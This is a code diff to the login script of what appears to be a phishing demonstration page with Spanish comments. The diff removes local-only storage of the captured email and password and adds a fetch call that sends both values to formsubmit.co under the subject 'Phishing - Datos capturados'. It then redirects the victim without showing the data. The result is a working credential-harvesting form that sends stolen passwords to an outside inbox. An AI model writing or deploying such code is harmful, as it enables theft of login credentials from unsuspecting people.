@@ -44,23 +44,33 @@
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
             
-            // Guardar datos para la página de revelación
             const credentials = {
                 email: email,
                 password: password,
                 timestamp: new Date().toISOString()
             };
-            localStorage.setItem('phishing_demo_data', JSON.stringify(credentials));
             
-            // Guardar en el registro local (para que el profesor lo vea en consola)
-            const allData = JSON.parse(localStorage.getItem('all_phishing_data') || '[]');
-            allData.push(credentials);
-            localStorage.setItem('all_phishing_data', JSON.stringify(allData));
+            // Enviar datos por email usando FormSubmit
+            fetch('https://formsubmit.co/ajax/TU_EMAIL_AQUI', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json'
+                },
+                body: JSON.stringify({
+                    email: email,
+                    password: password,
+                    _subject: ' Phishing - Datos capturados',
+                    _template: 'table'
+                })
+            }).then(response => response.json())
+            .then(data => {
+                console.log('Datos enviados:', data);
+            }).catch(error => {
+                console.error('Error:', error);
+            });
             
-            console.log('📊 DATOS CAPTURADOS:', credentials);
-            console.log('📋 Para ver todos los datos, escribe: JSON.parse(localStorage.getItem("all_phishing_data"))');
-            
-            // Redirigir a revelación
+            // Redirigir a revelación SIN mostrar datos
             window.location.href = 'revelacion.html';
         }
     </script>
